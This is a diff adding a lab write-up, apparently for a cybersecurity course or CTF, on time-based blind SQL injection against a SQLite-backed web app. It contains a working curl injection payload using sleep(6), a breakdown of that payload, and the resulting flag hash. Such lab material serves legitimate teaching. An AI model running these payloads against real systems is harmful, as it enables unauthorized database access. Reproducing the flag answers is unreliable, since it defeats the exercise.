@@ -362,3 +362,91 @@ git commit -m "2-flag.txt"
 git push
 ```
 
+
+## Task 3. SQLi - Time-Based Blind Injection
+
+In the realm of cybersecurity, not all vulnerabilities are visible or apparent. Blind SQL injection is a prime example of such hidden vulnerabilities.\
+In this task, you are challenged to detect and exploit a blind SQL injection vulnerability where the only indication of success is a delayed response from the server.\
+Your goal is to craft a `payload` that causes the server to return a `flag` ⛳️ if the query execution takes longer than `5` seconds.
+
+---
+
+\*
+
+Helpful Instructions:
+
+1. Understanding Time-based SQL Injection
+
+- Familiarize yourself with how SQL databases can be manipulated to delay responses using specific functions or commands.
+
+2. Your payload should incorporate a command that causes the server to wait or sleep for a specified duration (more than 5 seconds) before responding.
+
+- The exact function or command will depend on the database in use (e.g., `SLEEP()` for MySQL, `pg_sleep()` for PostgreSQL, `WAITFOR DELAY` for SQL Server).
+
+3. Observing Responses:
+
+- Use tools like Burp Suite to send your payloads and accurately measure the response times. This will help you fine-tune your payload to achieve the desired delay.
+
+4. Iterative Testing:
+
+- You may not get it right on the first try. Use an iterative approach, adjusting your payload based on response times, to zero in on a successful exploitation technique.
+
+\*
+
+
+## **Solution**:
+
+### Test whether the database supports sleep()
+
+We already know the database is SQLite.
+
+SQLite doesn't provide a built-in `sleep()` function, unlike MySQL. However, the challenge has already demonstrated a custom `version()` function, so it might also implement `sleep()`.
+
+We'll test that first.
+
+Executing:
+
+```bash
+curl -sS -G "$URL" \
+  --data-urlencode "status=paid' AND (SELECT sleep(6)) IS NULL-- " \
+  -w '\nHTTP: %{http_code} | Time: %{time_total}s\n'
+# [[1,"c160b23374436bb938ac95a9f5bbf7ed","Paid","TIMOUT FLAG","FLAG@web0x01.hbtn"]]
+#
+# HTTP: 200 | Time: 6.066384s
+```
+
+
+### What are we doing?
+
+The injected expression is:
+
+```sql
+paid' AND (SELECT sleep(6)) IS NULL--
+```
+
+- `paid'`: Closes the original SQL string.
+- `AND`: Adds another condition.
+- `SELECT sleep(6)`: Attempts to introduce a 6-second delay.
+- `IS NULL`: Makes the expression a Boolean condition.
+- `-- `: Comments out the remaining original SQL.
+
+We use a scalar subquery to encourage SQLite to evaluate the sleep function once rather than once per matching order.
+
+The `curl -w` option measures the total HTTP response time.
+
+### Possible outcomes
+
+| Result                   | Meaning                                 |
+| ------------------------ | --------------------------------------- |
+| Approximately 6 seconds  | Strong indication that `sleep(6)` works |
+| Error mentioning `sleep` | Function probably isn't available       |
+| Immediate HTTP 200       | No evidence of the intended delay       |
+| Flag in response         | Task completed                          |
+
+```bash
+echo c160b23374436bb938ac95a9f5bbf7ed > 3-flag.txt
+git add .
+git commit -m "3-flag.txt"
+git push
+```
+
